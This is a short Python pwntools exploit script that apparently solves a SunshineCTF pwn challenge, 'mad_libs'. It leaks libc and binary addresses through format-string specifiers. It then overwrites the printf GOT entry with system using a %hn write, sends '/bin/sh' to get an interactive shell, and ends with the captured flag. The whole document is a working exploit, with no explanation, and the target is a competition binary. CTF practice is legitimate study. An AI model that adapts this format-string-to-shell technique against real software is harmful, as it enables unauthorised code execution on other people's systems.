#!/usr/bin/env python3
from pwn import *

PORT = 26001
HOST = "chal.sunshinectf.games"
elf = context.binary = ELF('./mad_libs_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x000000000000125F
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def data(dt): sla(b'> ', dt)

# GDB()
data(b'%38$p|%59$p|')
libc.address = int(p.recvuntil(b'|', drop = True), 16) - 0x2044e0
log.info(f'libc: {hex(libc.address)}')
elf.address = int(p.recvuntil(b'|', drop = True), 16) - 0x12f8
log.info(f'elf: {hex(elf.address)}')

system = libc.sym.system & 0xffff
fmt = f'%{system}c%10$hn'.encode()
pl = fmt.ljust(0x10, b'A') + p64(elf.got.printf)
# GDB()
data(pl)
p.sendline(b'/bin/sh\n')

p.interactive()

# sun{f1ll_iN_th3_g0T_eNtry}